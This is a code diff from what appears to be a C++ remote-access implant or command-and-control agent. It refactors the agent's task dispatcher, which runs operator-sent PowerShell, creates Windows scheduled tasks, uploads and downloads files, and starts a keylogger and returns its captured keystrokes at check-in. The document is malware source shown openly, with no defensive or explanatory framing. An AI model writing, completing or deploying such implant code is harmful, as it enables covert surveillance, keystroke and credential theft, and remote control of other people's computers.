@@ -93,57 +93,58 @@ void Agent::Start()
             auto request = taskManager.GetNextTask();
 
             Response result = std::visit(overloaded{
-                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
-                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
+                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response
+                {
+                    return this->ExecutePowerShell(
+                        psRequest.taskID,
+                        psRequest.data);
                 },
-                [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response {
-                    return this->CreateWindowsTaskW(winTaskRequest.taskID, winTaskRequest.data);
+
+                [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response
+                {
+                    return this->CreateWindowsTaskW(
+                        winTaskRequest.taskID,
+                        winTaskRequest.data);
                 },
-                [](const auto& unhandledRequest) -> Response {
-                    return TaskResponse<TaskSuccess>{ };
+
+                [this](const TaskRequest<CommandUploadFile>& uploadRequest) -> Response
+                {
+                    return this->UploadFile(
+                        uploadRequest.taskID,
+                        uploadRequest.data);
+                },
+
+                [this](const TaskRequest<CommandDownloadFile>& downloadRequest) -> Response
+                {
+                    return this->DownloadFile(
+                        downloadRequest.taskID,
+                        downloadRequest.data);
+                },
+
+                [this](const TaskRequest<CommandKeylogger>& keyloggerRequest) -> Response
+                {
+                    return keyloggerRequest.type == KEYLOGGER_START
+                        ? this->keylogger.keylog_start(keyloggerRequest.taskID)
+                        : this->keylogger.get_keylog_data(keyloggerRequest.taskID);
+                },
+
+                // Return an error response for explicitly unsupported Boolean tasks.
+                [](const TaskRequest<bool>&) -> Response
+                {
+                    return CreateTaskResponse(
+                        0,
+                        NO_CODE,
+                        NO_CODE,
+                        TASK_ERROR,
+                        TaskError{1, "Unsupported task."});
+                },
+
+                // Provide a default response for any other unhandled request type.
+                [](const auto&) -> Response
+                {
+                    return TaskResponse<TaskSuccess>{};
                 }
             }, request);
-
-                    // Handle file upload requests.
-                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
-                    {
-                        return this->UploadFile(
-                            uploadRequest.taskID,
-                            uploadRequest.data);
-                    },
-
-                    // Handle file download requests.
-                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
-                    {
-                        return this->DownloadFile(
-                            downloadRequest.taskID,
-                            downloadRequest.data);
-                    },
-
-                    [this](const TaskRequest<CommandKeylogger> &keyloggerRequest) -> Response
-                    {
-                        return keyloggerRequest.type == KEYLOGGER_START
-                            ? this->keylogger.keylog_start(keyloggerRequest.taskID)
-                            : this->keylogger.get_keylog_data(keyloggerRequest.taskID);
-                    },
-
-                    // Return an error response for explicitly unsupported Boolean tasks.
-                    [](const TaskRequest<bool> &) -> Response
-                    {
-                        return CreateTaskResponse(
-                            0,
-                            NO_CODE,
-                            NO_CODE,
-                            TASK_ERROR,
-                            TaskError{1, "Unsupported task."});
-                    },
-
-                    // Provide a default response for any other unhandled request type.
-                    [](const auto &) -> Response
-                    {
-                        return TaskResponse<TaskSuccess>{};
-                    }},
-                request);
 
             // Store the response so it can be included in a subsequent check-in.
             taskManager.StoreTaskResult(result);
